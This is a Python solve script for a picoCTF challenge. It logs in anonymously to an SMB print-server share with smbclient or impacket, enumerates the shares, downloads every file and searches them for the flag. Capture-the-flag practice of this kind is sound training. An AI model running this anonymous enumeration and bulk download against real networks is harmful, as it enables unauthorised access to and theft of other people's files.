#!/usr/bin/env python3
"""
Printer Shares - picoCTF 2026 (General Skills, 50 pts)

Retrieve a flag from a misconfigured SMB print server share.
The printer exposes its spool via anonymous SMB access.

Usage:
    python3 solve.py [HOST] [PORT]

Requires: smbclient (apt install smbclient) or impacket (pip install impacket)
"""

import os
import re
import subprocess
import sys
import tempfile

# ============================================================
# Configuration - update with actual challenge values
# ============================================================
HOST = sys.argv[1] if len(sys.argv) > 1 else "mysterious-sea.picoctf.net"
PORT = sys.argv[2] if len(sys.argv) > 2 else "53888"

SHARE_NAME = "shares"  # Default share name; adjust if different


def method_smbclient():
    """
    Method 1: Use smbclient command-line tool.
    This is the most straightforward approach.
    """
    print("[*] Method 1: Using smbclient...")

    # Check if smbclient is available
    try:
        subprocess.run(["smbclient", "--version"], capture_output=True, check=True)
    except FileNotFoundError:
        print("[!] smbclient not found. Install with: sudo apt install smbclient")
        return None

    # Step 1: List available shares
    print(f"[*] Listing shares on //{HOST}:{PORT}...")
    try:
        result = subprocess.run(
            ["smbclient", "-L", f"//{HOST}", "-p", PORT, "-N"],
            capture_output=True, text=True, timeout=30
        )
        print(f"[*] Available shares:\n{result.stdout}")

        # Parse share names from output
        share_names = []
        for line in result.stdout.split("\n"):
            line = line.strip()
            if "Disk" in line:
                share_name = line.split()[0]
                share_names.append(share_name)
                print(f"[+] Found share: {share_name}")

    except subprocess.TimeoutExpired:
        print("[!] Connection timed out. Check HOST and PORT.")
        return None
    except Exception as e:
        print(f"[!] Error listing shares: {e}")
        share_names = [SHARE_NAME]  # Fall back to default

    # Step 2: Connect to each share and look for flag files
    for share in share_names or [SHARE_NAME]:
        print(f"\n[*] Connecting to share: {share}")

        with tempfile.TemporaryDirectory() as tmpdir:
            # Use smbclient to list and download files
            try:
                # List files in the share
                list_result = subprocess.run(
                    ["smbclient", f"//{HOST}/{share}", "-p", PORT, "-N",
                     "-c", "recurse ON; ls"],
                    capture_output=True, text=True, timeout=30
                )
                print(f"[*] Files in {share}:\n{list_result.stdout}")

                # Download all files
                download_result = subprocess.run(
                    ["smbclient", f"//{HOST}/{share}", "-p", PORT, "-N",
                     "-c", f"lcd {tmpdir}; recurse ON; prompt OFF; mget *"],
                    capture_output=True, text=True, timeout=30
                )

                # Search downloaded files for the flag
                for root, dirs, files in os.walk(tmpdir):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            with open(fpath, "r") as f:
                                content = f.read()
                                flag_match = re.search(r"picoCTF\{[^\}]+\}", content)
                                if flag_match:
                                    flag = flag_match.group(0)
                                    print(f"[+] Found flag in {fname}: {flag}")
                                    return flag
                                # Also print content of small text files
                                if len(content) < 500:
                                    print(f"[*] Content of {fname}: {content.strip()}")
                        except:
                            pass

                # Also try getting specific known filenames
                for flag_file in ["flag.txt", "flag", "FLAG.txt", "FLAG"]:
                    try:
                        result = subprocess.run(
                            ["smbclient", f"//{HOST}/{share}", "-p", PORT, "-N",
                             "-c", f"get {flag_file} {tmpdir}/flag_download"],
                            capture_output=True, text=True, timeout=15
                        )
                        flag_path = os.path.join(tmpdir, "flag_download")
                        if os.path.exists(flag_path):
                            with open(flag_path, "r") as f:
                                content = f.read().strip()
                                flag_match = re.search(r"picoCTF\{[^\}]+\}", content)
                                if flag_match:
                                    flag = flag_match.group(0)
                                    print(f"[+] Found flag: {flag}")
                                    return flag
                                if content:
                                    print(f"[*] Content of {flag_file}: {content}")
                    except:
                        pass

            except subprocess.TimeoutExpired:
                print(f"[!] Timeout connecting to {share}")
            except Exception as e:
                print(f"[!] Error: {e}")

    return None


def method_impacket():
    """
    Method 2: Use impacket's smbclient.
    Useful when system smbclient is not available.
    """
    print("[*] Method 2: Using impacket...")

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print("[!] impacket not found. Install with: pip install impacket")
        return None

    try:
        # Connect to SMB
        conn = SMBConnection(HOST, HOST, sess_port=int(PORT))
        conn.login("", "")  # Anonymous login
        print("[+] Connected anonymously!")

        # List shares
        shares = conn.listShares()
        print("[*] Available shares:")
        for share in shares:
            share_name = share["shi1_netname"][:-1]  # Remove null terminator
            print(f"    - {share_name}")

        # Try to access each share
        for share in shares:
            share_name = share["shi1_netname"][:-1]
            try:
                file_list = conn.listPath(share_name, "*")
                for f in file_list:
                    fname = f.get_longname()
                    if fname in [".", ".."]:
                        continue
                    print(f"[*] Found file: {share_name}/{fname}")

                    # Try to read the file
                    try:
                        with tempfile.NamedTemporaryFile(delete=False) as tmp:
                            conn.getFile(share_name, fname, tmp.write)
                            tmp_path = tmp.name

                        with open(tmp_path, "r") as fh:
                            content = fh.read()
                            flag_match = re.search(r"picoCTF\{[^\}]+\}", content)
                            if flag_match:
                                flag = flag_match.group(0)
                                print(f"[+] Found flag in {fname}: {flag}")
                                os.unlink(tmp_path)
                                conn.close()
                                return flag
                            if content.strip():
                                print(f"[*] Content: {content.strip()}")
                        os.unlink(tmp_path)
                    except Exception as e:
                        print(f"[!] Error reading {fname}: {e}")

            except Exception as e:
                print(f"[!] Cannot list {share_name}: {e}")

        conn.close()

    except Exception as e:
        print(f"[!] impacket connection failed: {e}")

    return None


def method_manual_commands():
    """Print manual commands for the user to try."""
    print("\n[*] Manual commands to try:")
    print(f"    # List shares:")
    print(f"    smbclient -L //{HOST} -p {PORT} -N")
    print(f"")
    print(f"    # Connect to 'shares':")
    print(f"    smbclient //{HOST}/{SHARE_NAME} -p {PORT} -N")
    print(f"")
    print(f"    # Inside smbclient, run:")
    print(f"    smb: \\> ls")
    print(f"    smb: \\> get flag.txt")
    print(f"    smb: \\> exit")
    print(f"")
    print(f"    # Read the flag:")
    print(f"    cat flag.txt")


def main():
    print(f"[*] Target: {HOST}:{PORT}")
    print(f"[*] Share:  {SHARE_NAME}")
    print()

    # Try smbclient first
    flag = method_smbclient()

    if not flag:
        # Try impacket as fallback
        flag = method_impacket()

    if flag:
        print(f"\n{'='*60}")
        print(f"[+] FLAG: {flag}")
        print(f"{'='*60}")
    else:
        print(f"\n[!] Could not automatically retrieve the flag.")
        method_manual_commands()


if __name__ == "__main__":
    main()
